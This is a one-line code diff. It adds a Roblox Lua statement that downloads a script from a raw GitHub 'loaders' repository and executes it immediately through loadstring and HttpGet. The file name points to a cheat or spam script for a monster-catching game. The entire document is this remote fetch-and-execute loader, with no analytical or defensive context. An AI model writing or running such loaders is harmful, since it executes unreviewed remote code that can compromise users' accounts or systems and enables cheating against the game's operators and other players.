@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/SlowDamselLog/loaders/main/loaders/now-catch-a-monster-spam3-gn93ab99o27gvd.lua"))()
